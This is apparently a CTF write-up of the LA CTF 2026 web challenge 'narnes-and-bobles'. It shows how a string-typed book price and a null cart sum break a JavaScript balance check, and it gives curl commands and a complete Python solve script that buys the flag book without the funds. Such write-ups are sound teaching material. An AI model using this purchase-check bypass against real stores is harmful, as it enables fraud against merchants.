---
title: "[Web] narnes-and-bobles"
description: Writeup for "narnes-and-bobles" from LA CTF 2026.
date: 2026-02-10 01:00:00 +0900
categories: [CTF, LA CTF 2026]
tags: [Web]
toc: true
comments: false
---

# narnes-and-bobles

> "I heard Amazon killed a certain book store so I'm gonna make my own book store and kill Amazon.  
> I dove deep and delivered results."

---

## TL;DR

- `/cart/add` blocks purchases if `additionalSum + cartSum > balance`.
- But one book in `books.json` has `price = "10"` (a **string**, not a number).
- Also, if the cart is empty, SQL `SUM()` returns `null`.
- When a string price mixes into the JS `+` operation, it breaks the math (string concatenation / NaN), so the balance check doesn't work correctly.
- By adding the string-price book **and** the flag book in the same request, the validation is bypassed and the checkout ZIP includes `flag.txt`.

---

## Overview

narnes-and-bobles is an online bookstore.

- Register / login
- Add books to cart
- Checkout → download purchased books as a ZIP

The flag book costs **1,000,000** but the starting balance is only **1,000**, so normal purchase is impossible.
The goal is to **bypass the balance check** and get `flag.txt` into the ZIP.

---

## Solution

### 1) Recon

Key endpoints:

- `POST /register/` — register (sets session cookie)
- `POST /login/` — login (sets session cookie)
- `GET /cart` — view cart and balance
- `POST /cart/add` — add to cart (balance check happens here)
- `POST /cart/checkout` — generate and download ZIP

The balance check only happens in `/cart/add`, so that's where we need to bypass.

---

### 2) Root Cause

#### (1) String price in books.json

Two books relevant to this exploit:

| Book | price |
|---|---|
| `part-time-parliament` | `"10"` (string) |
| `flag` | `1000000` (number) |

#### (2) JS type coercion + SUM(null)

The server calculates the total cost roughly like this:

```js
additionalSum = productsToAdd
  .filter(p => !p.is_sample)
  .map(p => booksLookup.get(p.book_id).price)
  .reduce((l, r) => l + r, 0)
```

If the cart is empty, the DB returns `cartSum = null`.

When `"10"` (string) gets mixed into the `+` operations, JavaScript switches from **number addition** to **string concatenation**, making `additionalSum` a string or producing a NaN-ish result.

The final check:

```js
if (additionalSum + cartSum > balance) { ... }
```

...no longer correctly evaluates "big number > 1000", so the server lets the cart addition through.

---

### 3) Exploit

**Goal:** bypass the balance limit and get `flag.txt` in the checkout ZIP.

#### Attack steps

1. Start with an **empty cart** (so `cartSum = null`).
2. Add the string-price book + flag book in a **single request** to `/cart/add`.
3. Balance check breaks due to type coercion → server allows it.
4. Call `/cart/checkout` to download the ZIP.
5. Extract `flag.txt` from the ZIP.

#### Book IDs used

- String-price book: `a3e33c2505a19d18` (part-time-parliament, price = `"10"`)
- Flag book: `2a16e349fb9045fa` (flag, price = `1000000`)

#### curl

**1) Confirm cart is empty**

```bash
curl -s -b cookies.txt "$BASE/cart"
# Expected: {"cart":[],"balance":1000}
```

**2) Add both books in one request**

```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST "$BASE/cart/add" \
  -H 'Content-Type: application/json' \
  --data-binary '{"products":[
    {"book_id":"a3e33c2505a19d18","is_sample":0},
    {"book_id":"2a16e349fb9045fa","is_sample":0}
  ]}'
```

If successful, `remainingBalance` will be a large negative number — but no error is returned.

**3) Checkout and extract the flag**

```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST "$BASE/cart/checkout" \
  -o order.zip

unzip -p order.zip flag.txt
```

---

## Flag

```
lactf{matcha_dubai_chocolate_labubu}
```

---

## solve.py

```python
#!/usr/bin/env python3
import argparse, io, random, re, string, sys, zipfile
from urllib.parse import urljoin
import requests

FLAG_RE = re.compile(r"lactf\{[^}]+\}")
STRING_PRICE_BOOK_ID = "a3e33c2505a19d18"  # part-time-parliament (price = "10")
FLAG_BOOK_ID         = "2a16e349fb9045fa"  # flag (price = 1000000)

def rand_str(n=10):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="e.g. https://...instancer.lac.tf")
    ap.add_argument("--user", default=None)
    ap.add_argument("--pw",   default=None)
    args = ap.parse_args()

    base = args.base.rstrip("/") + "/"
    s = requests.Session()
    username = args.user or f"u_{rand_str(12)}"
    password = args.pw   or f"p_{rand_str(16)}"

    # 1) Register
    s.post(urljoin(base, "register/"), data={"username": username, "password": password},
           allow_redirects=False, timeout=15)

    # 2) Login
    s.post(urljoin(base, "login/"), data={"username": username, "password": password},
           allow_redirects=False, timeout=15)

    # 3) Add string-price book + flag book together
    r = s.post(urljoin(base, "cart/add"),
               json={"products": [
                   {"book_id": STRING_PRICE_BOOK_ID, "is_sample": 0},
                   {"book_id": FLAG_BOOK_ID,         "is_sample": 0},
               ]}, timeout=15)
    r.raise_for_status()
    j = r.json()
    if "err" in j:
        sys.exit(f"[!] /cart/add error: {j['err']}")
    print("[+] Cart add succeeded")

    # 4) Checkout
    r = s.post(urljoin(base, "cart/checkout"), timeout=30)
    r.raise_for_status()

    # 5) Extract flag from ZIP
    try:
        zf = zipfile.ZipFile(io.BytesIO(r.content))
    except zipfile.BadZipFile:
        sys.exit("[!] Response is not a valid ZIP")

    if "flag.txt" not in zf.namelist():
        sys.exit(f"[!] flag.txt not in ZIP. Files: {zf.namelist()}")

    flag_txt = zf.read("flag.txt").decode("utf-8", errors="replace")
    m = FLAG_RE.search(flag_txt)
    print(f"[+] Flag: {m.group(0)}" if m else "[!] Flag pattern not found")

if __name__ == "__main__":
    main()
```

**Usage:**
```bash
python3 solve.py --base "https://...instancer.lac.tf"
```

---

## Notes

- The `is_sample` type trick (e.g. passing `"0"` as a string) may not work depending on the instance.
- This exploit focuses on the more reliable **price type mismatch + JS coercion** bypass.
